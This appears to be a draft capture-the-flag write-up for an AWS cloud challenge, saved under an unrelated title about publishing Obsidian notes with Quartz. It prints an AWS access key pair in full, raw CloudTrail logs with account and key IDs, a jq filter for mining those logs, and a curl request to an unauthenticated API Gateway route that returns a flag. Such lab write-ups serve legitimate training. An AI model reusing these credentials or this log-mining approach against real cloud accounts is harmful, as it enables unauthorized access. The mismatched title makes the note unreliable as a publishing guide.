```
---
title: "How to publish Obsidian notes with Quartz on GitHub Pages"
draft: true
tags:
  - 
---
```

![[Pasted image 20240930055210.png]]

![[Pasted image 20240930054728.png]]

![[Pasted image 20240930054737.png]]

```
Access Key ID: AKIAZI2LCYXNH62RXRH7
Access Secret Key: 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
```

![[Pasted image 20240930054756.png]]

```
┌──(kali㉿kali)-[~/Desktop/Cloud/CGCRTS]
└─$ cat flag1.txt      
```

After this step, find all the App ids to craft the lambda request:
![[Pasted image 20240930054944.png]]
## Getting Flag 2

JQ syntax to only output events related to the API gateway (which are the functions of interest)

- noticed that there are several API gateways in the logs, need to check which ones are still alive (so maybe needa do some API testing a bit). can use the command below (need gunzip and jq) to output all the relevant stages.
- note when running this command: be in the folder of ap-southeast-1 2024/07/17 logs

`gunzip -c *.gz | jq '.Records[] | select ((.eventSource == "apigateway.amazonaws.com") and (.responseElements != null))' | less`

craft potential lambda api: [https://f7x7yzf9j2.execute-api.ap-southeast-1.amazonaws.com/](https://f7x7yzf9j2.execute-api.ap-southeast-1.amazonaws.com/ "https://f7x7yzf9j2.execute-api.ap-southeast-1.amazonaws.com/") [https://kv0g2hke5e.execute-api.ap-southeast-1.amazonaws.com/](https://kv0g2hke5e.execute-api.ap-southeast-1.amazonaws.com/ "https://kv0g2hke5e.execute-api.ap-southeast-1.amazonaws.com/") [https://s14dfgslg5.execute-api.ap-southeast-1.amazonaws.com/](https://s14dfgslg5.execute-api.ap-southeast-1.amazonaws.com/ "https://s14dfgslg5.execute-api.ap-southeast-1.amazonaws.com/") [https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/](https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/ "https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/")


one endpoint will still be accessible as it responds with "Not Found"
![[Pasted image 20240930055003.png]]

1. determine that we need to work with : [https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/](https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/ "https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/") Lookinto the logs and we can find that the following request reveals the Stage Name: { "eventVersion": "1.09", "userIdentity": { "type": "IAMUser", "principalId": "AIDAZI2LCYXNLENAY2IQ3", "arn": "arn:aws:iam::637423240666:user/dev", "accountId": "637423240666", "accessKeyId": "AKIAZI2LCYXNH4OISNEW", "userName": "dev" }, "eventTime": "2024-07-17T05:56:53Z", "eventSource": "apigateway.amazonaws.com", "eventName": "CreateStage", "awsRegion": "ap-southeast-1", "sourceIPAddress": "8.29.230.19", "userAgent": "APN/1.0 HashiCorp/1.0 Terraform/1.3.7 (+[https://www.terraform.io/](https://www.terraform.io/ "https://www.terraform.io/")) terraform-provider-aws/5.57.0 (+[https://registry.terraform.io/providers/hashicorp/aws](https://registry.terraform.io/providers/hashicorp/aws "https://registry.terraform.io/providers/hashicorp/aws")) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/apigatewayv2#1.22.1",  
    "requestParameters": { **"stageName": "5587y0s9d5aed",** "autoDeploy": true, "apiId": "pxzfkfmjo7" }, "responseElements": { "lastUpdatedDate": "2024-07-17T05:56:53Z", "stageName": "5587y0s9d5aed", "createdDate": "2024-07-17T05:56:53Z", "routeSettings": {}, "autoDeploy": true, "defaultRouteSettings": { "detailedMetricsEnabled": false }, "stageVariables": "***", "tags": {} }, "requestID": "0f82efbd-c201-4748-9b2d-b6e273d282ec", "eventID": "bce754b5-5b06-4af6-8bdf-b60b8af0a71a", "readOnly": false, "eventType": "AwsApiCall", "managementEvent": true, "recipientAccountId": "637423240666", "eventCategory": "Management" }
    
    [Terraform Registry](https://registry.terraform.io/providers/hashicorp/aws))

The function name is still required so the following log will reveal the function name and HTTP Request type:


{
  "eventVersion": "1.09",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDAZI2LCYXNLENAY2IQ3",
    "arn": "arn:aws:iam::637423240666:user/dev",
    "accountId": "637423240666",
    "accessKeyId": "AKIAZI2LCYXNH4OISNEW",
    "userName": "dev"
  },
  "eventTime": "2024-07-17T05:56:53Z",
  "eventSource": "apigateway.amazonaws.com",
  "eventName": "UpdateRoute",
  "awsRegion": "ap-southeast-1",
  "sourceIPAddress": "8.29.230.19",
  "userAgent": "APN/1.0 HashiCorp/1.0 Terraform/1.3.7 (+https://www.terraform.io/) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/apigatewayv2#1.22.1",
  "requestParameters": {
    "routeId": "id6oeig",
    "routeKey": "POST /68fd47b8bf291eeea36480872f5ce29f0edb",
    "apiId": "pxzfkfmjo7"
  },
  "responseElements": {
    "authorizationType": "NONE",
    "routeId": "id6oeig",
    "apiKeyRequired": false,
    "routeKey": "POST /68fd47b8bf291eeea36480872f5ce29f0edb",
    "target": "integrations/9wo8sps"
  },
  "requestID": "e5b49d72-4664-4723-9cd3-6a9a93a4d7f2",
  "eventID": "64c0e31e-7de1-4cc6-9136-6d1f0cce05a7",
  "readOnly": false,
  "eventType": "AwsApiCall",
  "managementEvent": true,
  "recipientAccountId": "637423240666",
  "eventCategory": "Management"
}
Terraform Registry
[03:57]
the following URL will be crafted:

https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/5587y0s9d5aed/68fd47b8bf291eeea36480872f5ce29f0edb
[03:58]
Send a port request and you will get the 2nd part of the key:

"flag2": "&_me-0-wn1t0r1nNnG\//[>^n^<]\//}"

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com' -H $'Sec-Ch-Ua: \"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
    $'https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/5587y0s9d5aed/68fd47b8bf291eeea36480872f5ce29f0edb'

```


```
HTTP/2 200 OK
Date: Fri, 20 Sep 2024 19:46:35 GMT
Content-Type: application/json
Content-Length: 47
Apigw-Requestid: ea2cQiZYSQ0EMQg=

{"flag2": "&_me-0-wn1t0r1nNnG\\//[>^n^<]\\//}"}
```